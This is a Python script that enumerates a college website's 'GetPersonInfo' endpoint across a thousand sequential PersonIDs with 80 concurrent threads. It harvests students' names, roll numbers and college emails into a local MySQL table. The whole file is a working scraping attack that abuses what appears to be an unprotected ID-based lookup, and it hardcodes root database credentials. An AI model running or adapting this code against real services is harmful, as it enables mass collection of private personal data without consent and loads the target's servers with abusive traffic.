import requests
import concurrent.futures
import mysql.connector
import json


def create_database():
    mydb = mysql.connector.connect(
        host="localhost",
        user="root",
        password="root",
        port=3306
    )

    mycursor = mydb.cursor()

    create_db = "CREATE DATABASE users"
    try:
        mycursor.execute(create_db)
        print("DataBase Created successfully")
    except Exception as e:
        print('error creating db', e)

    mydb.close()


def create_user_table():

    mydb = mysql.connector.connect(
        host="localhost",
        user="root",
        password="root",
        port=3306,
        database="users"
    )

    mycursor = mydb.cursor()
    user_table = """
    CREATE TABLE users (
    ID INT AUTO_INCREMENT NOT NULL,
    UNIFIED_ID INT(30) NOT NULL,
    ROLLNO INT(30) NOT NULL,
    NAME VARCHAR(200),
    EMAIL VARCHAR(200),
    PRIMARY KEY (ID)
    );
    """
    try:
        mycursor.execute(user_table)
        print('User Table Created successfully')
    except Exception as e:
        print('Error creating UserTable', e)
    mydb.close()


def delete_user_table():

    mydb = mysql.connector.connect(
        host="localhost",
        user="root",
        password="root",
        port=3306,
        database="users"
    )

    mycursor = mydb.cursor()
    delete_table = "DROP TABLE users"
    try:
        mycursor.execute(delete_table)
        print("delete successfully")
    except Exception as e:
        print("Error deleting table", e)
    mydb.close()


mydb = mysql.connector.connect(
    host="localhost",
    user="root",
    password="root",
    port=3306,
    database="users"
)

mycursor = mydb.cursor()


def add_user(unified_id, rollno, name, email):

    print(f"ADDING USER {rollno} {unified_id} {name} {email}")
    add_user_query = """
    INSERT INTO users (UNIFIED_ID, ROLLNO, NAME, EMAIL) values (%s,%s,%s,%s)
    """
    user_data = (unified_id, rollno, name, email)
    try:
        mycursor.execute(add_user_query, user_data)
        print(f'ADDED: {user_data}')
    except Exception as e:
        print(f"Error adding user {user_data}", e)


def make_request(payload):
    person_id = payload['PersonID']
    timeout = 60
    URL = 'http://rajalakshmi.in/UI/Modules/Profile/Profile.aspx/GetPersonInfo'
    try:
        response = requests.post(
            URL,
            json=payload,
            timeout=timeout,
        )
        response.raise_for_status()
        return person_id, response.status_code, response.json()
    except requests.exceptions.HTTPError as errh:
        return person_id, response.status_code, f"HTTP Error: {errh}"
    except requests.exceptions.ConnectionError as errc:
        return person_id, response.status_code, f"Error Connecting: {errc}"
    except requests.exceptions.Timeout as errt:
        return person_id, response.status_code, f"Timeout Error: {errt}"
    except requests.exceptions.RequestException as err:
        return person_id, response.status_code, f"Request Exception: {err}"


def minigun():

    list_of_users = []
    payloads = []
    for i in range(29000, 30000):
        # print(i)
        payloads.append(
            {
                'PersonID': i
            }
        )
    with concurrent.futures.ThreadPoolExecutor(max_workers=80) as executor:
        futures = {
            executor.submit(make_request, payload):
            payload for payload in payloads
        }

        count = 0
        total_count = 0
        for future in concurrent.futures.as_completed(futures):
            payload = futures[future]
            try:
                person_id, status_code, response = future.result()
                print(status_code)
                if status_code == 200:
                    list_of_users.append((person_id, response))
                    print("| FOUND USER: ", count,
                          "| TOTAL TRIES:", total_count, "|")
                    count += 1
            except Exception as e:
                print(
                    f"|PersonID: {person_id} \
                    | Payload: {payload} \
                    | Exception occurred: {e} |")

            total_count += 1

    count = 0
    for data in list_of_users:
        # person id
        person_id = data[0]
        # DATA
        details = data[1]['d']
        details = json.loads(details)
        # roll number
        try:
            rollnumber = details[0]['RollNumber']
        except KeyError:
            rollnumber = 0
        try:
            email = details[0]['CollegeEmail']
        except KeyError:
            email = ""
        # Name
        try:
            name = details[0]['Name'].strip('\t').replace(
                '\t', '').replace('..', '.').replace('  ', ' ')
        except Exception as e:
            print("Exception raised!", e)
            name = ""
        add_user(person_id, rollnumber, name, email)

        if count % 100 == 0:
            mydb.commit()
        count += 1

    mydb.commit()
    mydb.close()


if __name__ == "__main__":
    # create_database()
    # delete_user_table()
    # create_user_table()
    minigun()
